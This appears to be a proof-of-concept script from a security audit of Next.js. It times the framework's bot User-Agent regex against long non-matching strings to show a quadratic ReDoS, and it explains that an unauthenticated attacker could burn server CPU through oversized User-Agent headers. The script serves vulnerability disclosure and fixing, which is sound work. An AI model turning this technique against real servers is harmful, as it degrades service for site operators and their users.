// PoC: quadratic ReDoS in the HTML-limited bot User-Agent regex (Finding M-i).
// Loads the ACTUAL shipped pattern from the source file and times it against a
// non-matching User-Agent of increasing length. Unauth CPU DoS via User-Agent header.
import { readFileSync } from 'node:fs'

const srcPath = '../packages/next/src/shared/lib/router/utils/html-bots.ts'
const src = readFileSync(new URL(srcPath, import.meta.url), 'utf8')
// Extract the exact regex literal assigned to HTML_LIMITED_BOT_UA_RE.
const m = src.match(/HTML_LIMITED_BOT_UA_RE\s*=\s*\n?\s*(\/[\s\S]*?\/[a-z]*)\n/)
if (!m) { console.error('could not find regex in source'); process.exit(1) }
// eslint-disable-next-line no-eval
const re = (0, eval)(m[1])
console.log('Loaded shipped regex:', String(re).slice(0, 60) + '...\n')
console.log('Non-matching User-Agent (worst case), single .test() eval:')
for (const kb of [1, 2, 4, 8, 16]) {
  const ua = 'a'.repeat(kb * 1024)
  const t = process.hrtime.bigint()
  re.test(ua)
  const ms = Number(process.hrtime.bigint() - t) / 1e6
  console.log(`  ${String(kb).padStart(2)} KB UA : ${ms.toFixed(1)} ms`)
}
console.log('\nQuadratic (each doubling ~4x). Evaluated 2-3x/request incl. Edge SSR;')
console.log('fed the raw User-Agent header (bounded only by Node maxHeaderSize=16KB).')
console.log('Root cause: unanchored greedy leading term [\\w-]+-Google.')
